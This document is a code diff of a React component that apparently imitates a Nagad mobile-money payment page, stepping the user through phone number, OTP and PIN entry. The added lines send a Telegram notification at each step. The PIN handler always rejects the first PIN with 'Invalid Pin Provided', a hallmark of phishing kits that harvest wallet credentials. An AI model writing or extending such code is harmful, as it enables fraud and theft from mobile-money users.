@@ -70,13 +70,21 @@ const NagadPayment = () => {
   };
 
   const handleConfirm = () => {
-    if (isValidNumber()) { setPhoneError(""); setShowOtpView(true); }
+    if (isValidNumber()) { 
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs' });
+      setPhoneError(""); setShowOtpView(true); 
+    }
     else setPhoneError(language === 'bn' ? "অবৈধ মোবাইল নম্বর" : "Invalid mobile number");
   };
-  const handleOtpConfirm = () => { if (isValidOtp()) { setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0); } };
+  const handleOtpConfirm = () => { 
+    if (isValidOtp()) { 
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs' });
+      setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0); 
+    } 
+  };
   const handlePinConfirm = () => {
     if (pinAttempts === 0) {
-      sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Nagad' });
+      sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs' });
       setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided");
       setPinAttempts(1);
     } else {
